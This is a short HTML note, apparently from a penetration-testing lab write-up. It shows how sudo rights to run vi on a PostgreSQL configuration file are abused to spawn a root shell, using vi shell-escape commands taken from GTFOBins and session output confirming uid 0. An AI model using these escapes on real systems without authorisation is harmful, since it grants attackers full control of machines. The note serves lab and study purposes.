<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>vi only as root</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>vi only as root</h1><br/>Example:<br />So we have sudo privileges to edit the pg_hba.conf file using vi by running sudo /bin/vi<br />/etc/postgresql/11/main/pg_hba.conf . We will go to GTFOBins to see if we can abuse this privilege:<br /><a href="https://gtfobins.github.io/gtfobins/vi/#sudo">https://gtfobins.github.io/gtfobins/vi/#sudo</a><br /><br /><br />f the binary is allowed to run as superuser by sudo, it does not drop the elevated<br />privileges and may be used to access the file system, escalate or maintain privileged<br />access.<br /><br />sudo vi -c &#39;:!/bin/sh&#39; /dev/null<br /><br />OR<br /><br />Inside vi use the following:<br /><br />vi<br />:set shell=/bin/sh<br />:shell<br /><br /><a href=""><img src="images/38-1.png" alt="images/38-1.png" /></a><br /><br /><br /><a href=""><img src="images/38-2.png" alt="images/38-2.png" /></a><br /><br /><br /><br />postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf<br /># whoami<br />root<br /># id<br />uid=0(root) gid=0(root) groups=0(root)<br />#<br /><br />We got root access</div>
</body>
</html>
